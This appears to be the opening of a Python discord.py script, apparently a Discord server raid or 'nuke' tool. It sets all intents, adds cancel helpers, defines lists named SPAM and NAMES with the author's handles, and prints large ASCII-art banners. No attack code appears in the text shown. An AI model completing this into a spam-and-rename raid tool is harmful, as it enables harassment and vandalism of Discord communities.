import discord
from discord.ext import commands
import asyncio
import os
import random
import re
import time
import sys
from colorama import init, Fore

init(autoreset=True)
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
RED = Fore.RED

try:
    intents = discord.Intents.all()
except:
    intents = None

def check_cancel():
    global cancel
    return cancel

def reset_cancel():
    global cancel
    cancel = False

async def wait_cancel():
    global cancel
    loop = asyncio.get_running_loop()
    await loop.run_in_executor(None, input, YELLOW + "\n[!] Press ENTER to cancel: ")
    cancel = True

SPAM = ["Alhrbi", ".alhrbi", "rayan", "MaybeRayan"]
NAMES = ["Alhrbi", ".alhrbi", "rayan", "MaybeRayan"]

def printc(text, color=YELLOW):
    print(color + text)

def inp(prompt):
    return input(YELLOW + prompt)

LOGO_MAIN = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣟⣳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⣹⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⡔⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠒⠸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡿⡍⠀⢙⢅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠅⠀⠀⠘⠆⠀⢀⡄⢰⣮⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⢺⡃⢀⡀⠀⠀⠀⠀⢀⠀⠤⠄⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡆⠀⠀⠀⠚⡄⣃⣰⡟⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣄⠀⡄⠀⠀⠀⠘⡅⣴⠂⢀⠠⡰⠘⡁⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⣀⢸⣧⠀⠀⠀⠈⢾⣼⠏⠀⣿⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠈⢆⡁⠀⠀⠀⠤⡷⠠⠂⣁⠤⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⠄⠀⠀⠀⢸⡩⠀⢀⣿⠀⠸⣆⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠘⠕⠀⠀⠀⢀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣧⠁⠀⠀⠀⠼⡁⠌⡜⢸⢉⣳⠏⣇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣢⠀⠁⡄⠀⠘⠀⠀⠀⠠⣻⠀⠀⢀⢀⡠⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⠘⡾⡴⠊⣮⠓⢀⣟⠑⠄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⡔⠼⠁⢆⠀⡸⠀⠀⠀⠀⠀⠁⣯⠀⠀⡊⠂⠀⠀⠀⠀⠀⠀⣀⠤⡠⢤⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠁⠀⠘⡶⡃⠀⢌⡧⠐⠠⢘⢂⠀⠀⠀
⠀⠀⠀⠀⠀⣠⠚⢳⠀⠁⡄⠀⠑⢄⠀⠀⠀⠀⠀⡀⡇⠀⠀⢀⣄⡀⠀⠀⡠⠐⠈⣊⡉⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⣿⠄⠀⠀⠀⠀⠀⢰⠇⠀⠀⢫⠀⠱⡀⣦⣧⠠⡀⠀
⠀⠀⠀⠠⠚⠃⠈⠘⡠⠂⠘⡀⠀⢾⠀⠀⠀⠀⠀⣸⠃⠀⠀⣞⠉⠪⡍⠊⠠⢀⡀⠀⠀⠀⠀⠀⠀⠀⠂⠤⡀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠡⢐⣜⠊⠈⠉⢱⠏⡏⠀⠈⠀
⠀⠀⠀⠀⠀⠀⢘⠀⢊⢦⡶⠙⠄⠀⠀⠀⠀⠀⠰⡘⠀⠀⠀⢻⡆⠂⠘⢶⠀⠂⠈⠑⠀⠶⢓⠀⠀⠤⢀⣀⠀⠁⠦⠡⡄⢳⠄⠀⠀⠀⠀⠀⠀⠁⠑⡱⡀⣸⠟⠀⣇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠮⠀⠀⠢⣕⠀⠀⠀⠀⠀⠀⠀⣰⠇⠀⠀⢀⠸⡇⠀⡼⠐⠹⣄⠀⠀⠀⠀⠀⠙⠒⢆⠔⠀⠀⠂⣐⡀⢥⠒⠥⠤⠀⠀⠀⠀⠀⠀⠀⢀⣿⡛⠀⠀⣇⢠⠀⠀
⠀⠀⠀⠀⠀⡄⣸⣇⠀⣀⢼⡀⠀⠀⠀⠀⠀⡠⢣⠴⢲⡬⣥⣒⢣⠠⠁⢠⣒⣈⠳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠒⠀⠈⢦⡀⠀⠀⠀⠀⠀⠀⢨⡟⠡⠀⢀⡟⠘⢁⠀
⠀⠀⠀⠀⠠⡡⢫⣽⠞⠀⠀⠑⠢⠄⠀⢀⡼⠉⣡⠖⠁⠀⠀⠘⢺⣤⠞⠉⠀⠀⠙⢻⣦⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⢮⢦⣭⡉⠁⠀⢋⢵⡦⣌⣾⠁⠇⠀⠀
⠀⠀⠀⠀⡘⠀⢸⠋⠀⡀⠄⠀⠀⠀⡡⠋⣠⠞⠁⠀⠀⠀⠀⠰⢌⠀⠀⠀⠀⠀⠀⠀⠀⢷⡊⠰⠄⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠈⠻⣷⠬⠙⡅⠀⠀⠀⠈⢼⣽⣧⡇⠀⠀
⠀⠀⢀⠌⠀⠀⠘⡇⠁⠠⠀⠀⣠⠞⠁⠞⠁⠀⠀⠀⢀⣔⠮⠷⠁⠀⡀⠡⡀⠀⠀⠀⠀⠀⠡⡄⠀⠀⠀⠀⠢⠀⠀⠀⠀⠀⠀⠈⠀⠀⠈⠿⢄⠀⠈⠀⠀⠀⠀⠈⣷⢫⠀⠀
⠀⠀⣢⡀⠀⠀⠀⢻⢇⣀⣂⡜⣡⠀⠀⠀⠀⠀⠀⠀⠈⠄⠀⠀⠀⠀⠑⡀⠹⡄⠀⠀⠀⠀⠀⠌⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠂⠐⠒⠓⠺⢷⣦⡶⠖⠒⠀⢻⢻⠀⡄⠀
⠄⠞⢃⠃⠀⠀⠄⠀⢩⢗⣉⠖⠁⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⡀⡈⢆⠀⠀⠀⠀⠀⠈⡗⠄⡀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣷⠻⠶⡐⡺⠟⠀⠁⠂⠀
⠀⠀⢸⢠⡀⣶⠶⠞⠃⠁⠁⠀⠀⠀⠀⠀⠀⡀⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡰⠀⠡⡀⡄⠀⠀⠀⠘⡄⠈⠰⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⣿⣠⠀⠀⣀⠀⡀⠀⠠⠀
⠀⠀⠀⠎⠀⠈⣦⡤⣄⡀⠀⠀⠀⠀⢀⢆⣤⠗⠡⡠⠄⣀⠀⠀⠀⠀⠀⠀⠀⠈⡳⠀⠘⣸⣄⠀⠀⠈⠜⡄⠀⠀⠈⠠⡠⠀⠤⠀⠀⠀⠀⠀⠀⠘⣮⣇⣤⡴⣶⣿⣝⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠸⢳⣲⠩⡳⢤⣤⣾⠯⠊⢁⣀⣀⣒⣐⡒⣢⢄⠡⠀⠀⠀⠀⠀⠈⠳⠀⠘⡇⠢⠠⠈⠂⣻⡔⣁⡀⡀⠀⢠⠀⠀⠀⠀⠀⠀⠀⢠⣷⣿⠟⡟⡟⣫⣽⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢷⠁⠈⠺⡇⠀⠐⢄⠀⠀⠘⢧⣉⣀⠜⠀⠀⠑⠀⠀⠀⠀⠀⠀⠑⣄⠰⠀⠙⠪⡄⠻⣇⠀⠅⠙⠛⢉⡿⡍⠀⠒⢒⠄⠀⡾⣿⢹⢈⣿⣿⢊⡞⡍⠆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⣧⡐⢳⣥⠀⠀⠀⠈⠀⠺⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠣⡧⠀⠀⠈⠓⠼⣷⣔⡈⠩⠁⠀⠵⡄⠊⠀⠀⢸⣇⡏⣿⣾⠏⢘⠆⡽⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠁⠈⡽⡆⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⢄⠀⠀⠀⠀⠉⠻⠓⢤⢀⣀⡀⣧⠀⠀⢰⣜⢻⡇⢻⣿⠀⠸⠄⣱⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠉⣷⠀⠀⠀⠀⠸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⣺⢸⢀⢰⣿⣾⠀⠘⡇⠀⠀⡑⡏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⠹⣜⣄⣻⡇⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⣿⢸⣾⡟⡸⢀⣶⠃⠀⠀⠃⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⢾⢉⣯⣄⢷⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣷⢻⡆⣿⣶⣷⣯⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⠟⠁⣹⠇⣯⡏⠎⣦⠀⠀⠀⠈⢧⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠑⢸⣷⣿⣽⡍⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣝⢸⠜⡯⣁⠋⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⠀⢸⣿⠛⣿⣗⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡌⠈⢸⢮⡇⣮⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠂⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠀⢀⣾⡋⢨⣯⠿⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠙⠀⢣⠃⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⢀⣾⢻⣶⡜⡏⠀⠻⣣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠄⠀⢈⡷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠂⣷⠓⣶⡗⠀⠀⠈⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠈⠀⠘⢆⡀⠀⠀⠀⠀⣀⣀⠀⡀⣀⡀⡀⡀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢀⡰⠉⡄⢀⡻⠀⠙⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠑⢄⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⣠⠊⠀⠀⣇⡼⠁⠀⠀⠘⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠈⠛⠋⠃⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀⢽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠈⠳⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠚⠁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢀⡀⠀⠀⠀⠀⠀⠀⠀⠛⢦⡀⠀⠀⠀⠀⠀⠀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡜⠲⢶⣬⣵⣒⠀⠠⠄⢀⣀⡙⠢⢀⣀⡤⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢗⡚⠋⠐⠂⠈⠡⠙⣛⠭⠵⠂⠌⡱⣦⣤⣄⠘⡀⠠⣶⣖⡶⠦⠴⠯⠭⠽⠟⠛⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠐⠂⠤⠀⠄⣃⣀⣁⢈⣽⡾⠛⢛⣳⣦⠈⠀⡀⢀⠀⢀⠠⠀⠀⠀⠀⠀⠘⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠈⢩⡇⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⠤⡤⠤⠿⠁⠀Alhrbi.com
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠇⠀  githun.com/5cxx
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡁
"""

DRAGON = r"""
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣛⣛⣟⢩⣍⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣯⣿⣿⣿
⣿⣿⣿⣿⣿⢟⣉⠋⠉⠻⣿⣿⣿⡿⠋⠡⠃⠋⠩⠉⠁⢈⠉⠀⠀⠈⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣶⣿⣿⣿⣿
⣿⣿⣿⣿⡇⣿⣿⣿⣦⡠⣤⣋⠉⠀⠀⣠⣦⠲⣮⡳⣦⡊⠢⡀⠂⢑⠱⡀⢙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣽⣾⣿⣿⣿⣿
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⡎⢉⠴⣀⠂⠇⢿⣧⠱⡝⢏⠈⡀⠜⣆⠀⡇⠀⡀⣀⢙⠻⣿⣿⣿⣿⣿⣿⢟⣿⣿⣽⣽⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⡘⢀⠸⢺⠀⠸⣨⡛⠇⠀⡌⠆⢿⣌⠈⠄⠃⡀⠐⢈⠀⠾⣭⣟⡻⢿⣿⣿⢿⣿⣾⣻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⠃⠀⠘⢰⠀⠀⡁⠐⢟⠁⠇⠀⢀⠙⠦⠀⡆⢸⠀⠈⠢⣀⠺⠽⢿⣿⣞⡽⣻⠷⣿⣻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣸⣿⣿⣿⣿⠀⢠⠀⢸⢰⠀⠂⠀⠘⡄⢨⢸⠸⠛⠀⠀⠀⠘⠀⠀⢍⠒⠿⢒⣤⣾⣿⣿⠗⣾⣶⠽⡻⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣇⣿⣿⣿⣿⡄⠀⠸⠚⠰⠧⠀⠰⣤⣄⠈⣀⢄⢤⣈⢂⢀⠀⠀⠀⠈⣠⣬⣶⣝⡻⢿⡟⣸⣿⣿⣿⣾⣔⡝⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡸⣿⣿⣿⡇⠁⠀⠂⠀⠰⠄⣄⣾⡟⣾⣿⣿⣿⣧⠏⠀⠀⡠⡆⡄⣿⣿⣿⣿⣿⣷⢭⡻⢿⣿⣿⣿⣿⣿⣿⣮⡻
⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⡇⠐⠀⠀⠀⡈⢿⣿⣿⣿⣿⣿⣿⣿⣤⠖⠀⠀⡀⠁⠇⣿⣿⣿⣿⣿⣿⠺⢟⣥⣶⣶⣾⣿⣿⣿⡿⣳
⣿⣿⣿⣿⣿⣿⣿⡞⣿⣿⣿⡠⠀⠐⢠⣀⢠⡸⢿⣿⣿⣯⣾⡿⡋⣴⢃⡜⠀⠄⢰⣿⣿⣿⠿⣻⣽⣾⣿⣿⣿⣿⣿⣿⡿⢛⣽⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣷⣵⡄⠀⠣⢆⢿⣷⣎⣽⣛⣫⣞⡉⠂⢈⡠⢀⣪⣭⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⢟⣯⣾⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⡀⣀⣀⡀⣁⠂⢿⣿⣿⣿⣷⣄⠚⠼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣛⣭⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⢿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠩⣽⣟⣯⣴⣿⣦⣌⠛⠟⣿⣿⣿⠿⣛⣭⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣊⢯⣻⣿⣿⣿⣿⣿⣿⣿⣷⡈⠻⢿⣿⣟⢿⣿⣷⣦⣉⠩⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢚⣷⣽⣿⣿⣿⣿⣿⣿⣿⠃⣶⣦⣍⠻⣷⣜⢿⣿⣿⣷⡄⢙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⣿⣿⡟⣸⣿⣿⣿⣷⠈⢻⣷⣻⣿⣿⣿⡘⣿⣮⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⢿⣿⡟⠀⠛⠛⠉⠉⠁⠀⠀⢻⡇⣿⣿⣿⡇⠻⠛⠃⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣸⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⣿⣿⣿⠃⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡿⠃⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣶⣾⣿⣷⣶⣦⣤⣀⣀⣂⣀⣠⣤⢶⣤⣍⠀⠀⣀⢀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢸⣿⣿⡟⢰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣴⣿⣿⠟⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡫⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣭⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣻⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣵⣿⣿⣿⣿⣿⠼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⢟⠄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⡔⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠏⢀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⣰⠇⠀⠈⡈⣦⠄⡉⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣁⣶⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣏⠰⣿⠀⠀⢧⠃⢸⣿⣾⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣾⣿⣿⠂⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡦⣬⣤⣧⠘⣁⡈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⠀⡠⡸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣇⣿⣿⣿⡇⠘⣿⣆⠹⣿⣿⣿⣿⣷⡄⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⡽⣦⡀⢈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡼⣿⣿⣷⣦⣿⣿⣄⢻⣿⣿⣿⣿⣇⢿⣆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣯⣟⣿⣄⣓⣻⢭⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣷⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡜⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
